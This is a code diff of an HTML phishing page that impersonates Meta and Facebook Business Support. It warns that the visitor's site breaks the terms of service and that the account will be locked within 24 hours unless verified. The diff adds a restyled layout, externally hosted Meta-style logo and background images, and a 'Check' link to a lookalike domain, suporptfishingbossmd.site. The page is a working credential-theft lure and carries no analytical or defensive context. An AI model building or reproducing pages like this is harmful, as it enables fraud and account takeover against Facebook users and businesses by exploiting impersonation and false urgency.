@@ -5,90 +5,121 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Meta AI | Facebook Business Support</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+
     * {
-      box-sizing: border-box;
       margin: 0;
       padding: 0;
-      font-family: Arial, sans-serif;
+      box-sizing: border-box;
     }
 
     body, html {
       height: 100%;
-      width: 100%;
+      font-family: 'Poppins', sans-serif;
+      background-color: #000;
+      color: white;
+      overflow: hidden;
     }
 
-    body {
-      background: linear-gradient(-45deg, #0d0d0d, #1a1a1a, #333333, #0d0d0d);
-      background-size: 400% 400%;
-      animation: gradientBG 15s ease infinite;
-      color: white;
+    .background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      z-index: -1;
+    }
+
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      background: rgba(0, 0, 0, 0.6);
+    }
+
+    .container {
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
+      height: 100%;
       text-align: center;
       padding: 20px;
     }
 
-    @keyframes gradientBG {
-      0% {background-position: 0% 50%;}
-      50% {background-position: 100% 50%;}
-      100% {background-position: 0% 50%;}
-    }
-
-    .meta-title {
-      font-size: 24px;
-      color: #ff4dd2;
-      font-weight: bold;
+    .logo {
+      display: flex;
+      align-items: center;
       margin-bottom: 30px;
     }
 
-    .main-title {
-      font-size: 32px;
-      background: linear-gradient(to right, orange, pink);
+    .logo img {
+      width: 40px;
+      height: 40px;
+      margin-right: 10px;
+    }
+
+    .logo-text {
+      font-size: 1.5rem;
+      font-weight: 600;
+      background: linear-gradient(135deg, #ffcc33, #e233ff);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
-      font-weight: bold;
+    }
+
+    h1 {
+      font-size: 2rem;
+      background: linear-gradient(135deg, #ffcc33, #e233ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
       margin-bottom: 20px;
     }
 
-    .message {
-      max-width: 600px;
-      font-size: 16px;
-      color: #ccc;
-      margin-bottom: 30px;
-      line-height: 1.6;
+    p {
+      font-size: 1rem;
+      margin-bottom: 20px;
+      color: #ddd;
     }
 
-    .check-button {
-      background-color: #00aaff;
-      border: none;
-      padding: 12px 24px;
-      font-size: 16px;
-      font-weight: bold;
+    .btn {
+      background-color: #1877f2;
       color: white;
-      border-radius: 8px;
+      padding: 10px 25px;
+      font-size: 1rem;
+      border: none;
+      border-radius: 5px;
       cursor: pointer;
-      transition: background 0.3s ease;
+      text-decoration: none;
     }
 
-    .check-button:hover {
-      background-color: #007acc;
+    .btn:hover {
+      background-color: #145ec6;
     }
   </style>
 </head>
 <body>
-
-  <div class="meta-title">Meta AI</div>
-
-  <div class="main-title">Facebook Business Support</div>
-
-  <div class="message">
-    Our system has detected that your website violates our terms of service regarding content, images, and posts. <br><br>
-    You have 24 hours to verify your account and secure your page, otherwise your account will be permanently locked.
+  <div class="background">
+    <video autoplay muted loop playsinline width="100%" height="100%">
+      <source src="https://uncody.com/uploads/684d3419899a18081dda22f2/file-1749890227811.gif" type="video/mp4">
+      <!-- fallback for GIF -->
+      <img src="https://uncody.com/uploads/684d3419899a18081dda22f2/file-1749890227811.gif" alt="background" style="width:100%; height:100%; object-fit:cover;" />
+    </video>
+    <div class="overlay"></div>
   </div>
 
-  <button class="check-button">Check</button>
+  <div class="container">
+    <div class="logo">
+      <img src="https://uncody.com/uploads/684d3419899a18081dda22f2/file-1749890273207.png" alt="Meta Logo">
+      <div class="logo-text">Meta AI</div>
+    </div>
 
+    <h1>Facebook Business Support</h1>
+    <p>Our system has detected that your website violates our terms of service regarding content, images, and posts.</p>
+    <p>You have 24 hours to verify your account and secure your page, otherwise your account will be permanently locked.</p>
+
+    <a class="btn" href="https://www.suporptfishingbossmd.site/p3">Check</a>
+  </div>
 </body>
 </html>
